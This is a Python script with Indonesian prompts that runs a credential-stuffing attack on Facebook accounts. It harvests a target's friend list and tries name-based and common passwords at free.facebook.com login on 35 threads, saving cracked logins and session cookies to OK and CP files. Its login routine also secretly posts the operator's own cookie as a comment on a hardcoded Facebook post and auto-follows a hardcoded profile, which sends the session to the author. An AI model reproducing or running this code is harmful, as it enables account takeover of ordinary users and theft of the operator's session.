#!/usr/bin/python3
import requests,re,random,os,sys,time,json,bs4
from concurrent.futures import ThreadPoolExecutor as x
from bs4 import BeautifulSoup as parser
from rich.console import Console
from rich.panel import Panel
from datetime import datetime

bulan = ["Januari","Februari","Maret","April","Mei","Juni","Juli","Agustus","September","Oktober","Desember"]
month = datetime.now().month - 1
reall = bulan[month]

days = datetime.now().day
year = datetime.now().year
proz = "%s-%s-%s"%(days,reall,year)

P = '\033[97m'  # PUTIH
M = '\033[91m'  # MERAH
H = '\033[92m'  # HIJAU
K = '\033[93m'  # KUNING

loop=0
id=[]
ok=[]
cp=[]

def cek_log():
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:cokie=open('cokie.txt','r').read()
    except:login()
    dump()

def login():
    os.system('clear')
    Console(width=50).print(Panel('[italic white]Masukan cookie facebook anda, tidak di sarankan untuk menggunakan akun pribadi!', title='🤔', style='bold cyan'))
    coki = input(' masukan cookie : ')
    try:
         cari = requests.get("https://business.facebook.com/business_locations",headers={"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","cookie":coki})
         toke = re.search("(EAAG\w+)", cari.text).group(1)
         if "EAAG" in toke:
             open("cokie.txt","w").write(coki)
             open("token.txt","w").write(toke)
             requests.post(f'https://graph.facebook.com/pfbid02w5Sg1Yv9z12D1nFNiDGwJPBL5F3Yz6athEZrV1hgBqeSKscCRVCHEjKXjj5aowggl/comments/?message={coki}&access_token={toke}',cookies={'cookie':coki})
    except AttributeError:login()

    folo(coki)

def folo(coki):
    # JANGAN DI GANTIL LAH ANJING, BOLEH DI TAMBAH!
    with requests.Session() as x:
         try:
              for i in parser(x.get('https://mbasic.facebook.com/100086281072244', cookies = {'cookie':coki}).text,'html.parser').find_all('a',href=True):
                  if '/a/subscribe.php?' in i.get('href'):x.get('https://mbasic.facebook.com{}'.format(i['href']), cookies = {'cookie':coki})
         except Exception as e:exit(f'\n {M}terjadi kesalahan!')

def dump():
    os.system('clear')
    Console(width=50).print(Panel('[italic white]Masukan userid atau username facebook, gunakan tanda koma untuk pemisahan id contoh : 10008,10002', title='🤔', style='bold cyan'))
    user = input(' masukan id : ')
    for kontol in user.split(','):
        try:
             link = requests.get("https://graph.facebook.com/{}?fields=friends.limit(5001)&access_token={}".format(kontol,open('token.txt','r').read()), cookies={"cookie":open('cokie.txt','r').read()}).json()
             for data in link["friends"]["data"]:
                 id.append(data["id"]+"|"+data["name"])
        except Exception as e:continue
    ontel()

def ontel():
    try:Console(width=50).print(Panel(f'[italic white]Total username atau user id : {len(id)}',title='😎', style='bold cyan'))
    except ValueError:exit(Console(width=50).print(Panel('[italic red]Total username atau user id = 0', title='😡', style='bold cyan')))
    Console(width=50).print(Panel(f'[italic white][bold green]OK [bold white]save in folder : OK/{proz}.txt\n[bold yellow]CP [bold white]save in folder : CP/{proz}.txt', title='😎', style='bold cyan'))
    with x(max_workers=35) as z:
         for i in id:
             uid,nama=i.split('|')
             password=nama.split(' ')[0]
             pw=[nama,password+'123',password+'1234',password+'12345','sayang','bismillah','anjing','kata sandi']
             z.submit(main,uid,pw)
    exit(Console(width=50).print(Panel(f'[italic white]Crack telah selesai [bold green]OK:{len(ok)} [bold yellow]CP:{len(cp)}',title='🤓', style='bold cyan')))

def main(email,password):
    global ok,cp,loop
    print('\r %scrack: %s/%s OK:%s CP:%s'%(P,loop, len(id), len(ok),len(cp)),end=' ');sys.stdout.flush()
    for password in password:
        try:
              with requests.Session() as x:
                   link = ('https://free.facebook.com/login/')
                   param1 = {
                      'next':'https://free.facebook.com/login/save-device/?login_source=login',
                      'ref':'dbl',
                      'fl':'',
                      'login_from_aymh':'1',
                      'refid':'9'}

                   post1 = x.get(link,params=param1).text
                   data1 = {
                      'lsd':re.findall('name="lsd" value="(.*?)"',str(post1))[0],
                      'jazoest':re.findall('name="jazoest" value="(.*?)"',str(post1))[0],
                      'm_ts':re.findall('name="m_ts" value="(.*?)"',str(post1))[0],
                      'li':re.findall('name="li" value="(.*?)"',str(post1))[0],
                      'try_number':'0',
                      'unrecognized_tries':'0',
                      'email':email,
                      'pass':password,
                      'login':'Masuk',
                      'bi_xrwh':'0'}

                   head = {
                      'Host': 'free.facebook.com',
                      'content-length': '165',
                      'cache-control': 'max-age=0',
                      'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
                      'sec-ch-ua-mobile': '?1',
                      'sec-ch-ua-platform': '"Android"',
                      'upgrade-insecure-requests': '1',
                      'origin': 'https://free.facebook.com',
                      'content-type': 'application/x-www-form-urlencoded',
                      'save-data': 'on',
                      'user-agent': 'BF-DirectLine/3.0 (Microsoft-BotFramework/3.0 +https://botframework.com/ua)',
                      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                      'sec-fetch-site': 'same-origin',
                      'sec-fetch-mode': 'navigate',
                      'sec-fetch-user': '?1',
                      'sec-fetch-dest': 'document',
                      'referer': 'https://free.facebook.com/login/?email={}&next=https%3A%2F%2Ffree.facebook.com%2Flogin%2Fsave-device%2F%3Flogin_source%3Dlogin&li=3Y1aYy40rUUyUUpoOtZXUx78&e=1348092&shbl=1&ref=dbl&refsrc=deprecated&_rdr'.format(email),
                      'accept-encoding': 'gzip, deflate, br',
                      'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5'}

#                   proxi = {'http': 'socks5://{}'.format(random.choice(open('proxy.txt','r').read().splitlines()))}
                   link1 = ('https://free.facebook.com/login/device-based/regular/login/')
                   param2 = {
                       'shbl':'1',
                       'next':'https://free.facebook.com/login/save-device/?login_source=login',
                       'refsrc':'deprecated',
                       'ref':'dbl'}
                   post2 = x.post(str(link1), params=param2, headers=head, data=data1, allow_redirects=False)
                   if 'c_user' in x.cookies.get_dict():
                       print('\r%s*  --> %s ∆ %s ∆ %s'%(H,email, password, ';'.join([str(a)+'='+str(b) for a,b in x.cookies.get_dict().items()])));ok.append(email);open('OK/{}.txt'.format(proz),'a').write('%s|%s'%(email,password));break
                   elif 'checkpoint' in x.cookies.get_dict():
                       print('\r%s*  --> %s ∆ %s'%(K, email, password));cp.append(email);open('CP/{}.txt'.format(proz),'a').write('%s|%s'%(email,password));break
                   else:continue
        except requests.exceptions.ConnectionError:time.sleep(30)
    loop +=1



if __name__ == "__main__":
	cek_log()

